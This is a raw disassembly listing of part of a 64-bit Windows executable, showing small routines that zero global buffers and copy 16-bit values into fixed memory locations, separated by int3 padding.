   1400088cb:	cc                   	int3
   1400088cc:	cc                   	int3
   1400088cd:	cc                   	int3
   1400088ce:	cc                   	int3
   1400088cf:	cc                   	int3
   1400088d0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400088d3:	0f 29 05 06 5d 28 00 	movaps %xmm0,0x285d06(%rip)        # 0x14028e5e0
   1400088da:	0f 29 05 ef 5c 28 00 	movaps %xmm0,0x285cef(%rip)        # 0x14028e5d0
   1400088e1:	0f 29 05 d8 5c 28 00 	movaps %xmm0,0x285cd8(%rip)        # 0x14028e5c0
   1400088e8:	0f 29 05 c1 5c 28 00 	movaps %xmm0,0x285cc1(%rip)        # 0x14028e5b0
   1400088ef:	0f 29 05 aa 5c 28 00 	movaps %xmm0,0x285caa(%rip)        # 0x14028e5a0
   1400088f6:	0f 29 05 93 5c 28 00 	movaps %xmm0,0x285c93(%rip)        # 0x14028e590
   1400088fd:	0f 29 05 7c 5c 28 00 	movaps %xmm0,0x285c7c(%rip)        # 0x14028e580
   140008904:	0f 29 05 65 5c 28 00 	movaps %xmm0,0x285c65(%rip)        # 0x14028e570
   14000890b:	66 c7 05 dc 5c 28 00 	movw   $0x0,0x285cdc(%rip)        # 0x14028e5f0
   140008912:	00 00 
   140008914:	c3                   	ret
   140008915:	cc                   	int3
   140008916:	cc                   	int3
   140008917:	cc                   	int3
   140008918:	cc                   	int3
   140008919:	cc                   	int3
   14000891a:	cc                   	int3
   14000891b:	cc                   	int3
   14000891c:	cc                   	int3
   14000891d:	cc                   	int3
   14000891e:	cc                   	int3
   14000891f:	cc                   	int3
   140008920:	c6 05 fb 5c 28 00 01 	movb   $0x1,0x285cfb(%rip)        # 0x14028e622
   140008927:	0f b7 01             	movzwl (%rcx),%eax
   14000892a:	66 89 05 cf 5c 28 00 	mov    %ax,0x285ccf(%rip)        # 0x14028e600
   140008931:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008935:	66 89 05 c6 5c 28 00 	mov    %ax,0x285cc6(%rip)        # 0x14028e602
   14000893c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008940:	66 89 05 bd 5c 28 00 	mov    %ax,0x285cbd(%rip)        # 0x14028e604
   140008947:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   14000894b:	66 89 05 b4 5c 28 00 	mov    %ax,0x285cb4(%rip)        # 0x14028e606
   140008952:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008956:	66 89 05 ab 5c 28 00 	mov    %ax,0x285cab(%rip)        # 0x14028e608
   14000895d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008961:	66 89 05 a2 5c 28 00 	mov    %ax,0x285ca2(%rip)        # 0x14028e60a
   140008968:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   14000896c:	66 89 05 99 5c 28 00 	mov    %ax,0x285c99(%rip)        # 0x14028e60c
   140008973:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008977:	66 89 05 90 5c 28 00 	mov    %ax,0x285c90(%rip)        # 0x14028e60e
   14000897e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008982:	66 89 05 87 5c 28 00 	mov    %ax,0x285c87(%rip)        # 0x14028e610
   140008989:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   14000898d:	66 89 05 7e 5c 28 00 	mov    %ax,0x285c7e(%rip)        # 0x14028e612
   140008994:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008998:	66 89 05 75 5c 28 00 	mov    %ax,0x285c75(%rip)        # 0x14028e614
   14000899f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   1400089a3:	66 89 05 6c 5c 28 00 	mov    %ax,0x285c6c(%rip)        # 0x14028e616
   1400089aa:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   1400089ae:	66 89 05 63 5c 28 00 	mov    %ax,0x285c63(%rip)        # 0x14028e618
   1400089b5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   1400089b9:	66 89 05 5a 5c 28 00 	mov    %ax,0x285c5a(%rip)        # 0x14028e61a
   1400089c0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   1400089c4:	66 89 05 51 5c 28 00 	mov    %ax,0x285c51(%rip)        # 0x14028e61c
   1400089cb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   1400089cf:	66 89 05 48 5c 28 00 	mov    %ax,0x285c48(%rip)        # 0x14028e61e
   1400089d6:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   1400089da:	66 89 05 3f 5c 28 00 	mov    %ax,0x285c3f(%rip)        # 0x14028e620
   1400089e1:	c3                   	ret
   1400089e2:	cc                   	int3
   1400089e3:	cc                   	int3
   1400089e4:	cc                   	int3
   1400089e5:	cc                   	int3
   1400089e6:	cc                   	int3
   1400089e7:	cc                   	int3
   1400089e8:	cc                   	int3
   1400089e9:	cc                   	int3
   1400089ea:	cc                   	int3
   1400089eb:	cc                   	int3
   1400089ec:	cc                   	int3
   1400089ed:	cc                   	int3
   1400089ee:	cc                   	int3
   1400089ef:	cc                   	int3
   1400089f0:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400089f3:	0f 29 05 16 5c 28 00 	movaps %xmm0,0x285c16(%rip)        # 0x14028e610
   1400089fa:	0f 29 05 ff 5b 28 00 	movaps %xmm0,0x285bff(%rip)        # 0x14028e600
   140008a01:	66 c7 05 16 5c 28 00 	movw   $0x0,0x285c16(%rip)        # 0x14028e620
   140008a08:	00 00 
   140008a0a:	c3                   	ret
   140008a0b:	cc                   	int3
   140008a0c:	cc                   	int3
   140008a0d:	cc                   	int3
   140008a0e:	cc                   	int3
   140008a0f:	cc                   	int3
   140008a10:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008a13:	0f 11 05 80 5c 28 00 	movups %xmm0,0x285c80(%rip)        # 0x14028e69a
   140008a1a:	0f 29 05 6f 5c 28 00 	movaps %xmm0,0x285c6f(%rip)        # 0x14028e690
   140008a21:	0f 29 05 58 5c 28 00 	movaps %xmm0,0x285c58(%rip)        # 0x14028e680
   140008a28:	0f 29 05 41 5c 28 00 	movaps %xmm0,0x285c41(%rip)        # 0x14028e670
   140008a2f:	0f 29 05 2a 5c 28 00 	movaps %xmm0,0x285c2a(%rip)        # 0x14028e660
   140008a36:	0f 29 05 13 5c 28 00 	movaps %xmm0,0x285c13(%rip)        # 0x14028e650
   140008a3d:	0f 29 05 fc 5b 28 00 	movaps %xmm0,0x285bfc(%rip)        # 0x14028e640
   140008a44:	0f 29 05 e5 5b 28 00 	movaps %xmm0,0x285be5(%rip)        # 0x14028e630
   140008a4b:	c3                   	ret
   140008a4c:	cc                   	int3
   140008a4d:	cc                   	int3
   140008a4e:	cc                   	int3
   140008a4f:	cc                   	int3
   140008a50:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008a53:	0f 11 05 60 5c 28 00 	movups %xmm0,0x285c60(%rip)        # 0x14028e6ba
   140008a5a:	0f 29 05 4f 5c 28 00 	movaps %xmm0,0x285c4f(%rip)        # 0x14028e6b0
   140008a61:	c3                   	ret
   140008a62:	cc                   	int3
   140008a63:	cc                   	int3
   140008a64:	cc                   	int3
   140008a65:	cc                   	int3
   140008a66:	cc                   	int3
   140008a67:	cc                   	int3
   140008a68:	cc                   	int3
   140008a69:	cc                   	int3
   140008a6a:	cc                   	int3
   140008a6b:	cc                   	int3
   140008a6c:	cc                   	int3
   140008a6d:	cc                   	int3
   140008a6e:	cc                   	int3
   140008a6f:	cc                   	int3
   140008a70:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008a73:	0f 29 05 b6 5c 28 00 	movaps %xmm0,0x285cb6(%rip)        # 0x14028e730
   140008a7a:	0f 29 05 9f 5c 28 00 	movaps %xmm0,0x285c9f(%rip)        # 0x14028e720
   140008a81:	0f 29 05 88 5c 28 00 	movaps %xmm0,0x285c88(%rip)        # 0x14028e710
   140008a88:	0f 29 05 71 5c 28 00 	movaps %xmm0,0x285c71(%rip)        # 0x14028e700
   140008a8f:	0f 29 05 5a 5c 28 00 	movaps %xmm0,0x285c5a(%rip)        # 0x14028e6f0
   140008a96:	0f 29 05 43 5c 28 00 	movaps %xmm0,0x285c43(%rip)        # 0x14028e6e0
   140008a9d:	0f 29 05 2c 5c 28 00 	movaps %xmm0,0x285c2c(%rip)        # 0x14028e6d0
   140008aa4:	66 c7 05 93 5c 28 00 	movw   $0x0,0x285c93(%rip)        # 0x14028e740
   140008aab:	00 00 
   140008aad:	c3                   	ret
   140008aae:	cc                   	int3
   140008aaf:	cc                   	int3
   140008ab0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008ab3:	0f 29 05 96 5c 28 00 	movaps %xmm0,0x285c96(%rip)        # 0x14028e750
   140008aba:	66 c7 05 9d 5c 28 00 	movw   $0x0,0x285c9d(%rip)        # 0x14028e760
   140008ac1:	00 00 
   140008ac3:	c3                   	ret
   140008ac4:	cc                   	int3
   140008ac5:	cc                   	int3
   140008ac6:	cc                   	int3
   140008ac7:	cc                   	int3
   140008ac8:	cc                   	int3
   140008ac9:	cc                   	int3
   140008aca:	cc                   	int3
   140008acb:	cc                   	int3
   140008acc:	cc                   	int3
   140008acd:	cc                   	int3
   140008ace:	cc                   	int3
   140008acf:	cc                   	int3
   140008ad0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008ad3:	0f 29 05 f6 5c 28 00 	movaps %xmm0,0x285cf6(%rip)        # 0x14028e7d0
   140008ada:	0f 29 05 df 5c 28 00 	movaps %xmm0,0x285cdf(%rip)        # 0x14028e7c0
   140008ae1:	0f 29 05 c8 5c 28 00 	movaps %xmm0,0x285cc8(%rip)        # 0x14028e7b0
   140008ae8:	0f 29 05 b1 5c 28 00 	movaps %xmm0,0x285cb1(%rip)        # 0x14028e7a0
   140008aef:	0f 29 05 9a 5c 28 00 	movaps %xmm0,0x285c9a(%rip)        # 0x14028e790
   140008af6:	0f 29 05 83 5c 28 00 	movaps %xmm0,0x285c83(%rip)        # 0x14028e780
   140008afd:	0f 29 05 6c 5c 28 00 	movaps %xmm0,0x285c6c(%rip)        # 0x14028e770
   140008b04:	c7 05 d2 5c 28 00 00 	movl   $0x0,0x285cd2(%rip)        # 0x14028e7e0
   140008b0b:	00 00 00 
   140008b0e:	c3                   	ret
   140008b0f:	cc                   	int3
   140008b10:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008b13:	0f 29 05 d6 5c 28 00 	movaps %xmm0,0x285cd6(%rip)        # 0x14028e7f0
   140008b1a:	c7 05 dc 5c 28 00 00 	movl   $0x0,0x285cdc(%rip)        # 0x14028e800
   140008b21:	00 00 00 
   140008b24:	c3                   	ret
   140008b25:	cc                   	int3
   140008b26:	cc                   	int3
   140008b27:	cc                   	int3
   140008b28:	cc                   	int3
   140008b29:	cc                   	int3
   140008b2a:	cc                   	int3
   140008b2b:	cc                   	int3
   140008b2c:	cc                   	int3
   140008b2d:	cc                   	int3
   140008b2e:	cc                   	int3
   140008b2f:	cc                   	int3
   140008b30:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008b33:	0f 11 05 e2 5c 28 00 	movups %xmm0,0x285ce2(%rip)        # 0x14028e81c
   140008b3a:	0f 29 05 cf 5c 28 00 	movaps %xmm0,0x285ccf(%rip)        # 0x14028e810
   140008b41:	c3                   	ret
   140008b42:	cc                   	int3
   140008b43:	cc                   	int3
   140008b44:	cc                   	int3
   140008b45:	cc                   	int3
   140008b46:	cc                   	int3
   140008b47:	cc                   	int3
   140008b48:	cc                   	int3
   140008b49:	cc                   	int3
   140008b4a:	cc                   	int3
   140008b4b:	cc                   	int3
   140008b4c:	cc                   	int3
   140008b4d:	cc                   	int3
   140008b4e:	cc                   	int3
   140008b4f:	cc                   	int3
   140008b50:	c6 05 15 5d 28 00 01 	movb   $0x1,0x285d15(%rip)        # 0x14028e86c
   140008b57:	0f b7 01             	movzwl (%rcx),%eax
   140008b5a:	66 89 05 cf 5c 28 00 	mov    %ax,0x285ccf(%rip)        # 0x14028e830
   140008b61:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008b65:	66 89 05 c6 5c 28 00 	mov    %ax,0x285cc6(%rip)        # 0x14028e832
   140008b6c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008b70:	66 89 05 bd 5c 28 00 	mov    %ax,0x285cbd(%rip)        # 0x14028e834
   140008b77:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140008b7b:	66 89 05 b4 5c 28 00 	mov    %ax,0x285cb4(%rip)        # 0x14028e836
   140008b82:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008b86:	66 89 05 ab 5c 28 00 	mov    %ax,0x285cab(%rip)        # 0x14028e838
   140008b8d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008b91:	66 89 05 a2 5c 28 00 	mov    %ax,0x285ca2(%rip)        # 0x14028e83a
   140008b98:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   140008b9c:	66 89 05 99 5c 28 00 	mov    %ax,0x285c99(%rip)        # 0x14028e83c
   140008ba3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008ba7:	66 89 05 90 5c 28 00 	mov    %ax,0x285c90(%rip)        # 0x14028e83e
   140008bae:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008bb2:	66 89 05 87 5c 28 00 	mov    %ax,0x285c87(%rip)        # 0x14028e840
   140008bb9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140008bbd:	66 89 05 7e 5c 28 00 	mov    %ax,0x285c7e(%rip)        # 0x14028e842
   140008bc4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008bc8:	66 89 05 75 5c 28 00 	mov    %ax,0x285c75(%rip)        # 0x14028e844
   140008bcf:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140008bd3:	66 89 05 6c 5c 28 00 	mov    %ax,0x285c6c(%rip)        # 0x14028e846
   140008bda:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140008bde:	66 89 05 63 5c 28 00 	mov    %ax,0x285c63(%rip)        # 0x14028e848
   140008be5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008be9:	66 89 05 5a 5c 28 00 	mov    %ax,0x285c5a(%rip)        # 0x14028e84a
   140008bf0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140008bf4:	66 89 05 51 5c 28 00 	mov    %ax,0x285c51(%rip)        # 0x14028e84c
   140008bfb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140008bff:	66 89 05 48 5c 28 00 	mov    %ax,0x285c48(%rip)        # 0x14028e84e
   140008c06:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140008c0a:	66 89 05 3f 5c 28 00 	mov    %ax,0x285c3f(%rip)        # 0x14028e850
   140008c11:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140008c15:	66 89 05 36 5c 28 00 	mov    %ax,0x285c36(%rip)        # 0x14028e852
   140008c1c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140008c20:	66 89 05 2d 5c 28 00 	mov    %ax,0x285c2d(%rip)        # 0x14028e854
   140008c27:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   140008c2b:	66 89 05 24 5c 28 00 	mov    %ax,0x285c24(%rip)        # 0x14028e856
   140008c32:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140008c36:	66 89 05 1b 5c 28 00 	mov    %ax,0x285c1b(%rip)        # 0x14028e858
   140008c3d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140008c41:	66 89 05 12 5c 28 00 	mov    %ax,0x285c12(%rip)        # 0x14028e85a
   140008c48:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   140008c4c:	66 89 05 09 5c 28 00 	mov    %ax,0x285c09(%rip)        # 0x14028e85c
   140008c53:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140008c57:	66 89 05 00 5c 28 00 	mov    %ax,0x285c00(%rip)        # 0x14028e85e
   140008c5e:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140008c62:	66 89 05 f7 5b 28 00 	mov    %ax,0x285bf7(%rip)        # 0x14028e860
   140008c69:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   140008c6d:	66 89 05 ee 5b 28 00 	mov    %ax,0x285bee(%rip)        # 0x14028e862
   140008c74:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140008c78:	66 89 05 e5 5b 28 00 	mov    %ax,0x285be5(%rip)        # 0x14028e864
   140008c7f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140008c83:	66 89 05 dc 5b 28 00 	mov    %ax,0x285bdc(%rip)        # 0x14028e866
   140008c8a:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   140008c8e:	66 89 05 d3 5b 28 00 	mov    %ax,0x285bd3(%rip)        # 0x14028e868
   140008c95:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   140008c99:	66 89 05 ca 5b 28 00 	mov    %ax,0x285bca(%rip)        # 0x14028e86a
   140008ca0:	c3                   	ret
   140008ca1:	cc                   	int3
   140008ca2:	cc                   	int3
   140008ca3:	cc                   	int3
   140008ca4:	cc                   	int3
   140008ca5:	cc                   	int3
   140008ca6:	cc                   	int3
   140008ca7:	cc                   	int3
   140008ca8:	cc                   	int3
   140008ca9:	cc                   	int3
   140008caa:	cc                   	int3
   140008cab:	cc                   	int3
   140008cac:	cc                   	int3
   140008cad:	cc                   	int3
   140008cae:	cc                   	int3
   140008caf:	cc                   	int3
   140008cb0:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008cb3:	0f 11 05 a2 5b 28 00 	movups %xmm0,0x285ba2(%rip)        # 0x14028e85c
   140008cba:	0f 11 05 8f 5b 28 00 	movups %xmm0,0x285b8f(%rip)        # 0x14028e850
   140008cc1:	0f 11 05 78 5b 28 00 	movups %xmm0,0x285b78(%rip)        # 0x14028e840
   140008cc8:	0f 11 05 61 5b 28 00 	movups %xmm0,0x285b61(%rip)        # 0x14028e830
   140008ccf:	c3                   	ret
   140008cd0:	c6 05 d5 5b 28 00 01 	movb   $0x1,0x285bd5(%rip)        # 0x14028e8ac
   140008cd7:	0f b7 01             	movzwl (%rcx),%eax
   140008cda:	66 89 05 8f 5b 28 00 	mov    %ax,0x285b8f(%rip)        # 0x14028e870
   140008ce1:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008ce5:	66 89 05 86 5b 28 00 	mov    %ax,0x285b86(%rip)        # 0x14028e872
   140008cec:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008cf0:	66 89 05 7d 5b 28 00 	mov    %ax,0x285b7d(%rip)        # 0x14028e874
   140008cf7:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140008cfb:	66 89 05 74 5b 28 00 	mov    %ax,0x285b74(%rip)        # 0x14028e876
   140008d02:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008d06:	66 89 05 6b 5b 28 00 	mov    %ax,0x285b6b(%rip)        # 0x14028e878
   140008d0d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008d11:	66 89 05 62 5b 28 00 	mov    %ax,0x285b62(%rip)        # 0x14028e87a
   140008d18:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   140008d1c:	66 89 05 59 5b 28 00 	mov    %ax,0x285b59(%rip)        # 0x14028e87c
   140008d23:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008d27:	66 89 05 50 5b 28 00 	mov    %ax,0x285b50(%rip)        # 0x14028e87e
   140008d2e:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008d32:	66 89 05 47 5b 28 00 	mov    %ax,0x285b47(%rip)        # 0x14028e880
   140008d39:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140008d3d:	66 89 05 3e 5b 28 00 	mov    %ax,0x285b3e(%rip)        # 0x14028e882
   140008d44:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008d48:	66 89 05 35 5b 28 00 	mov    %ax,0x285b35(%rip)        # 0x14028e884
   140008d4f:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140008d53:	66 89 05 2c 5b 28 00 	mov    %ax,0x285b2c(%rip)        # 0x14028e886
   140008d5a:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140008d5e:	66 89 05 23 5b 28 00 	mov    %ax,0x285b23(%rip)        # 0x14028e888
   140008d65:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008d69:	66 89 05 1a 5b 28 00 	mov    %ax,0x285b1a(%rip)        # 0x14028e88a
   140008d70:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140008d74:	66 89 05 11 5b 28 00 	mov    %ax,0x285b11(%rip)        # 0x14028e88c
   140008d7b:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140008d7f:	66 89 05 08 5b 28 00 	mov    %ax,0x285b08(%rip)        # 0x14028e88e
   140008d86:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140008d8a:	66 89 05 ff 5a 28 00 	mov    %ax,0x285aff(%rip)        # 0x14028e890
   140008d91:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140008d95:	66 89 05 f6 5a 28 00 	mov    %ax,0x285af6(%rip)        # 0x14028e892
   140008d9c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140008da0:	66 89 05 ed 5a 28 00 	mov    %ax,0x285aed(%rip)        # 0x14028e894
   140008da7:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   140008dab:	66 89 05 e4 5a 28 00 	mov    %ax,0x285ae4(%rip)        # 0x14028e896
   140008db2:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140008db6:	66 89 05 db 5a 28 00 	mov    %ax,0x285adb(%rip)        # 0x14028e898
   140008dbd:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140008dc1:	66 89 05 d2 5a 28 00 	mov    %ax,0x285ad2(%rip)        # 0x14028e89a
   140008dc8:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   140008dcc:	66 89 05 c9 5a 28 00 	mov    %ax,0x285ac9(%rip)        # 0x14028e89c
   140008dd3:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140008dd7:	66 89 05 c0 5a 28 00 	mov    %ax,0x285ac0(%rip)        # 0x14028e89e
   140008dde:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140008de2:	66 89 05 b7 5a 28 00 	mov    %ax,0x285ab7(%rip)        # 0x14028e8a0
   140008de9:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   140008ded:	66 89 05 ae 5a 28 00 	mov    %ax,0x285aae(%rip)        # 0x14028e8a2
   140008df4:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140008df8:	66 89 05 a5 5a 28 00 	mov    %ax,0x285aa5(%rip)        # 0x14028e8a4
   140008dff:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140008e03:	66 89 05 9c 5a 28 00 	mov    %ax,0x285a9c(%rip)        # 0x14028e8a6
   140008e0a:	0f b7 41 38          	movzwl 0x38(%rcx),%eax
   140008e0e:	66 89 05 93 5a 28 00 	mov    %ax,0x285a93(%rip)        # 0x14028e8a8
   140008e15:	0f b7 41 3a          	movzwl 0x3a(%rcx),%eax
   140008e19:	66 89 05 8a 5a 28 00 	mov    %ax,0x285a8a(%rip)        # 0x14028e8aa
   140008e20:	c3                   	ret
   140008e21:	cc                   	int3
   140008e22:	cc                   	int3
   140008e23:	cc                   	int3
   140008e24:	cc                   	int3
   140008e25:	cc                   	int3
   140008e26:	cc                   	int3
   140008e27:	cc                   	int3
   140008e28:	cc                   	int3
   140008e29:	cc                   	int3
   140008e2a:	cc                   	int3
   140008e2b:	cc                   	int3
   140008e2c:	cc                   	int3
   140008e2d:	cc                   	int3
   140008e2e:	cc                   	int3
   140008e2f:	cc                   	int3
   140008e30:	0f 57 c0             	xorps  %xmm0,%xmm0
   140008e33:	0f 11 05 62 5a 28 00 	movups %xmm0,0x285a62(%rip)        # 0x14028e89c
   140008e3a:	0f 11 05 4f 5a 28 00 	movups %xmm0,0x285a4f(%rip)        # 0x14028e890
   140008e41:	0f 11 05 38 5a 28 00 	movups %xmm0,0x285a38(%rip)        # 0x14028e880
   140008e48:	0f 11 05 21 5a 28 00 	movups %xmm0,0x285a21(%rip)        # 0x14028e870
   140008e4f:	c3                   	ret
   140008e50:	c6 05 91 5a 28 00 01 	movb   $0x1,0x285a91(%rip)        # 0x14028e8e8
   140008e57:	0f b7 01             	movzwl (%rcx),%eax
   140008e5a:	66 89 05 4f 5a 28 00 	mov    %ax,0x285a4f(%rip)        # 0x14028e8b0
   140008e61:	0f b7 41 02          	movzwl 0x2(%rcx),%eax
   140008e65:	66 89 05 46 5a 28 00 	mov    %ax,0x285a46(%rip)        # 0x14028e8b2
   140008e6c:	0f b7 41 04          	movzwl 0x4(%rcx),%eax
   140008e70:	66 89 05 3d 5a 28 00 	mov    %ax,0x285a3d(%rip)        # 0x14028e8b4
   140008e77:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140008e7b:	66 89 05 34 5a 28 00 	mov    %ax,0x285a34(%rip)        # 0x14028e8b6
   140008e82:	0f b7 41 08          	movzwl 0x8(%rcx),%eax
   140008e86:	66 89 05 2b 5a 28 00 	mov    %ax,0x285a2b(%rip)        # 0x14028e8b8
   140008e8d:	0f b7 41 0a          	movzwl 0xa(%rcx),%eax
   140008e91:	66 89 05 22 5a 28 00 	mov    %ax,0x285a22(%rip)        # 0x14028e8ba
   140008e98:	0f b7 41 0c          	movzwl 0xc(%rcx),%eax
   140008e9c:	66 89 05 19 5a 28 00 	mov    %ax,0x285a19(%rip)        # 0x14028e8bc
   140008ea3:	0f b7 41 0e          	movzwl 0xe(%rcx),%eax
   140008ea7:	66 89 05 10 5a 28 00 	mov    %ax,0x285a10(%rip)        # 0x14028e8be
   140008eae:	0f b7 41 10          	movzwl 0x10(%rcx),%eax
   140008eb2:	66 89 05 07 5a 28 00 	mov    %ax,0x285a07(%rip)        # 0x14028e8c0
   140008eb9:	0f b7 41 12          	movzwl 0x12(%rcx),%eax
   140008ebd:	66 89 05 fe 59 28 00 	mov    %ax,0x2859fe(%rip)        # 0x14028e8c2
   140008ec4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140008ec8:	66 89 05 f5 59 28 00 	mov    %ax,0x2859f5(%rip)        # 0x14028e8c4
   140008ecf:	0f b7 41 16          	movzwl 0x16(%rcx),%eax
   140008ed3:	66 89 05 ec 59 28 00 	mov    %ax,0x2859ec(%rip)        # 0x14028e8c6
   140008eda:	0f b7 41 18          	movzwl 0x18(%rcx),%eax
   140008ede:	66 89 05 e3 59 28 00 	mov    %ax,0x2859e3(%rip)        # 0x14028e8c8
   140008ee5:	0f b7 41 1a          	movzwl 0x1a(%rcx),%eax
   140008ee9:	66 89 05 da 59 28 00 	mov    %ax,0x2859da(%rip)        # 0x14028e8ca
   140008ef0:	0f b7 41 1c          	movzwl 0x1c(%rcx),%eax
   140008ef4:	66 89 05 d1 59 28 00 	mov    %ax,0x2859d1(%rip)        # 0x14028e8cc
   140008efb:	0f b7 41 1e          	movzwl 0x1e(%rcx),%eax
   140008eff:	66 89 05 c8 59 28 00 	mov    %ax,0x2859c8(%rip)        # 0x14028e8ce
   140008f06:	0f b7 41 20          	movzwl 0x20(%rcx),%eax
   140008f0a:	66 89 05 bf 59 28 00 	mov    %ax,0x2859bf(%rip)        # 0x14028e8d0
   140008f11:	0f b7 41 22          	movzwl 0x22(%rcx),%eax
   140008f15:	66 89 05 b6 59 28 00 	mov    %ax,0x2859b6(%rip)        # 0x14028e8d2
   140008f1c:	0f b7 41 24          	movzwl 0x24(%rcx),%eax
   140008f20:	66 89 05 ad 59 28 00 	mov    %ax,0x2859ad(%rip)        # 0x14028e8d4
   140008f27:	0f b7 41 26          	movzwl 0x26(%rcx),%eax
   140008f2b:	66 89 05 a4 59 28 00 	mov    %ax,0x2859a4(%rip)        # 0x14028e8d6
   140008f32:	0f b7 41 28          	movzwl 0x28(%rcx),%eax
   140008f36:	66 89 05 9b 59 28 00 	mov    %ax,0x28599b(%rip)        # 0x14028e8d8
   140008f3d:	0f b7 41 2a          	movzwl 0x2a(%rcx),%eax
   140008f41:	66 89 05 92 59 28 00 	mov    %ax,0x285992(%rip)        # 0x14028e8da
   140008f48:	0f b7 41 2c          	movzwl 0x2c(%rcx),%eax
   140008f4c:	66 89 05 89 59 28 00 	mov    %ax,0x285989(%rip)        # 0x14028e8dc
   140008f53:	0f b7 41 2e          	movzwl 0x2e(%rcx),%eax
   140008f57:	66 89 05 80 59 28 00 	mov    %ax,0x285980(%rip)        # 0x14028e8de
   140008f5e:	0f b7 41 30          	movzwl 0x30(%rcx),%eax
   140008f62:	66 89 05 77 59 28 00 	mov    %ax,0x285977(%rip)        # 0x14028e8e0
   140008f69:	0f b7 41 32          	movzwl 0x32(%rcx),%eax
   140008f6d:	66 89 05 6e 59 28 00 	mov    %ax,0x28596e(%rip)        # 0x14028e8e2
   140008f74:	0f b7 41 34          	movzwl 0x34(%rcx),%eax
   140008f78:	66 89 05 65 59 28 00 	mov    %ax,0x285965(%rip)        # 0x14028e8e4
   140008f7f:	0f b7 41 36          	movzwl 0x36(%rcx),%eax
   140008f83:	66 89 05 5c 59 28 00 	mov    %ax,0x28595c(%rip)        # 0x14028e8e6
   140008f8a:	c3                   	ret
   140008f8b:	cc                   	int3
   140008f8c:	cc                   	int3
   140008f8d:	cc                   	int3
   140008f8e:	cc                   	int3
   140008f8f:	cc                   	int3
   140008f90:	0f 57 c0             	xorps  %xmm0,%xmm0
